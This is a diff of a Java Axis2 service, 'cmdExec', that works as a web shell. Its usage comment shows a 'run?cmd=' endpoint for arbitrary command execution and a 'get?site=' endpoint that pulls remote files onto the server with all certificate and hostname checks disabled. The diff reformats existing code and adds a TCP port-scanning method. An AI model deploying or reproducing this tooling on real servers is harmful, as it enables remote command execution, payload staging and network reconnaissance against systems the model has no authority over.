@@ -1,19 +1,19 @@
 /*
  * cmd.java cmd.aar
-    Copyright (C)2012  Jeff Louisma @jefflouisma http://jefflouisma.com
+ Copyright (C)2012  Jeff Louisma @jefflouisma http://jefflouisma.com
 
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    any later version.
+ This program is free software: you can redistribute it and/or modify
+ it under the terms of the GNU General Public License as published by
+ the Free Software Foundation, either version 3 of the License, or
+ any later version.
 
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
+ This program is distributed in the hope that it will be useful,
+ but WITHOUT ANY WARRANTY; without even the implied warranty of
+ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+ GNU General Public License for more details.
 
-    You should have received a copy of the GNU General Public License
-    along with this program.  If not, see <http://www.gnu.org/licenses/>.
+ You should have received a copy of the GNU General Public License
+ along with this program.  If not, see <http://www.gnu.org/licenses/>.
  */
 package cmdexec;
 import java.io.*;
@@ -21,6 +21,7 @@ import java.net.*;
 import javax.net.ssl.*;
 
 /**
+ * Version: .2
  * Usage: 
  *  Execute program: http://PATHTOAXIS2/cmdExec/run?cmd=COMMAND
  *  Download file: http://PATHTOAXIS2/cmdExec/get?site=http(s)://site/file.ext
@@ -63,11 +64,9 @@ public class cmdExec {
 			return "JAVA PROBLEM: " + output;
 		}
 	}
-
 	/**
-	 * This is the download command 
+	 * This is the download command. 
 	 */
-
 	public String get(String site) throws InterruptedException {
 		//IGNORE CERTIFICATE ISSUES
 		TrustManager[] trustAllCerts = new TrustManager[]{
@@ -77,10 +76,10 @@ public class cmdExec {
 				}
 				public void checkClientTrusted(
 						java.security.cert.X509Certificate[] certs, String authType) {
-				}
+						}
 				public void checkServerTrusted(
 						java.security.cert.X509Certificate[] certs, String authType) {
-				}
+						}
 			}
 		};
 
@@ -89,13 +88,13 @@ public class cmdExec {
 			SSLContext sc = SSLContext.getInstance("SSL");
 			sc.init(null, trustAllCerts, new java.security.SecureRandom());
 			HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
-                        HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier(){
-                        public boolean verify(String string,SSLSession ssls) {
-                            return true;
-                            }
-                        });
-                    } 
-                catch (Exception e) {
+			HttpsURLConnection.setDefaultHostnameVerifier( new HostnameVerifier(){
+				public boolean verify(String string,SSLSession ssls) {
+					return true;
+				}
+			});
+		} 
+		catch (Exception e) {
 		}  
 
 		URL url; 
@@ -130,5 +129,28 @@ public class cmdExec {
 			+ "Location is usually the root tomcat directory use 'run?cmd=' to find it. :)";
 
 	}
-
+	/**
+	 * This is the port scanning command. 
+	 */
+	public String scan(String host) {
+                
+                String delims = "[:-]";
+		String answer = "";
+                String parts[] = host.split(delims);
+		
+                String ip = parts[0];
+		int startPort = Integer.parseInt(parts[1]);
+		int stopPort = Integer.parseInt(parts[2]);
+		
+                for(int i = startPort; i <= stopPort; i++){
+                    try{	
+			Socket ServerSok = new Socket(ip,i);
+			answer += "OPEN: " + i;
+			ServerSok.close();
+                    }
+                    catch (Exception e){}			
+                    }
+	return answer;
+        }
 }
+
